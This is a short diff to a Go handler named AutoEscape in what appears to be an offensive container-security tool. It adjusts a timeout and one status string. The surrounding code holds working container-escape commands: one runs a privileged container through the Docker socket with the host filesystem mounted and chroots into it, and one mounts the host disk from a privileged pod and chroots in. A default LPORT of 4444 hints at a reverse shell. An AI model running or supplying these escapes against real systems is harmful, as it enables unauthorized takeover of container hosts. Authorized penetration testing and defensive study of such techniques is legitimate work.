@@ -1204,7 +1204,7 @@ func (h *CDKHandler) AutoEscape(c *gin.Context) {
 		return
 	}
 	if req.TimeoutSec == 0 {
-		req.TimeoutSec = 60
+		req.TimeoutSec = 90 // covers Stage1 exec(30s) + Stage2 wait(30s) + Stage2 exec(20s) = 80s worst case
 	}
 	if req.LPORT == "" {
 		req.LPORT = "4444"
@@ -1315,7 +1315,7 @@ func (h *CDKHandler) AutoEscape(c *gin.Context) {
 			stage1Cmd = fmt.Sprintf(`command -v docker >/dev/null 2>&1 || { echo "MISSING_BINARY:docker"; exit 0; }; docker -H unix:///var/run/docker.sock run --rm --privileged --pid=host --net=host -v /:/host alpine:3.20 sh -c "chroot /host /bin/sh -c %s" 2>&1 && echo DOCKER_CONTAINER_CREATED || echo DOCKER_ESCAPE_FAILED`, hostCmd)
 		} else if containsStr(target.reasons, "privileged") {
 			method = "chroot_or_cgroup"
-			stage1Cmd = "command -v mount >/dev/null 2>&1 || { echo \"MISSING_BINARY:mount\"; exit 0; }; command -v chroot >/dev/null 2>&1 || { echo \"MISSING_BINARY:chroot\"; exit 0; }; fdisk -l 2>/dev/null | head -5; mkdir -p /tmp/host_escape; DEV=$(ls /dev/sd*1 /dev/vd*1 /dev/xvd*1 2>/dev/null | head -1); if [ -n \"$DEV\" ]; then mount $DEV /tmp/host_escape 2>&1 && echo MOUNT_OK && (chroot /tmp/host_escape /bin/sh -c 'echo ESCAPED_TO_HOST; id; hostname' 2>&1) || echo CHROOT_FAILED; else echo NO_HOST_DISK_TRY_CGROUP; fi"
+			stage1Cmd = "command -v mount >/dev/null 2>&1 || { echo \"MISSING_BINARY:mount\"; exit 0; }; command -v chroot >/dev/null 2>&1 || { echo \"MISSING_BINARY:chroot\"; exit 0; }; fdisk -l 2>/dev/null | head -5; mkdir -p /tmp/host_escape; DEV=$(ls /dev/sd*1 /dev/vd*1 /dev/xvd*1 2>/dev/null | head -1); if [ -n \"$DEV\" ]; then mount $DEV /tmp/host_escape 2>&1 && echo MOUNT_OK && (chroot /tmp/host_escape /bin/sh -c 'echo ESCAPED_TO_HOST; id; hostname' 2>&1) || echo CHROOT_FAILED; else echo NO_HOST_DISK; fi"
 		} else {
 			method = "manual_only"
 			stage1Cmd = "echo 'No automated escape path for this pod. Try manual methods.'; id; cat /proc/1/status 2>/dev/null | grep CapEff"
